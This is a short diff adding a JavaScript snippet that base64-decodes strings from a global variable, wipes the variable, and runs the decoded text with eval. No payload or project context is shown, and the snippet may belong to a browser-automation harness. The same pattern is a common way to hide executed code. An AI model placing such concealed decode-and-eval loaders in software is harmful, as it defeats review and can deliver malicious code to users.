@@ -1,0 +1,8 @@
+(async()=>{
+  const bin=atob((window.__encB64||[]).join(''));
+  const bytes=new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
+  const src=new TextDecoder('utf-8').decode(bytes);
+  window.__encB64=null;
+  return await eval(src);
+})()
